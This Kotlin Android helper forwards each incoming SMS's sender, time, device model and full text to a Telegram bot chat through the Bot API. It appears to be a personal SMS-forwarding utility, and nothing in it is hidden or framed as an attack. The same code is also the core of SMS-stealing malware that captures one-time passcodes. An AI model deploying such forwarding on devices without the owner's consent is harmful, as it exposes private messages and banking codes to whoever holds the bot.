package com.example

import android.os.AsyncTask
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

object NetworkHelper {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    private val gson = Gson()
    private val JSON = "application/json; charset=utf-8".toMediaType()

    // Token Bot Telegram dan Chat ID dari pengguna yang diambil secara aman melalui BuildConfig (.env)
    private val TELEGRAM_BOT_TOKEN = BuildConfig.TELEGRAM_BOT_TOKEN
    private val TELEGRAM_CHAT_ID = BuildConfig.TELEGRAM_CHAT_ID
    private val TELEGRAM_URL = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"

    fun sendSmsData(sender: String, body: String, timestamp: Long) {
        // Jalankan di background thread
        AsyncTask.execute {
            try {
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val formattedDate = dateFormat.format(Date(timestamp))
                val deviceModel = android.os.Build.MODEL

                // Escape karakter HTML agar aman dari error parse Telegram
                val escapedSender = sender.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                val escapedBody = body.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                val escapedDevice = deviceModel.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

                val messageHtml = """
                    <b>📩 SMS MASUK BARU</b>
                    
                    <b>👤 Pengirim:</b> <code>$escapedSender</code>
                    <b>⏰ Waktu:</b> <code>$formattedDate</code>
                    <b>📱 Perangkat:</b> <code>$escapedDevice</code>
                    
                    <b>💬 Isi SMS:</b>
                    $escapedBody
                """.trimIndent()

                val payload = mapOf(
                    "chat_id" to TELEGRAM_CHAT_ID,
                    "text" to messageHtml,
                    "parse_mode" to "HTML"
                )

                val json = gson.toJson(payload)
                val requestBody = json.toRequestBody(JSON)
                val request = Request.Builder()
                    .url(TELEGRAM_URL)
                    .post(requestBody)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        android.util.Log.e("NetworkHelper", "Gagal kirim Telegram: Code ${response.code}")
                    } else {
                        android.util.Log.d("NetworkHelper", "Sukses meneruskan SMS ke Telegram")
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}

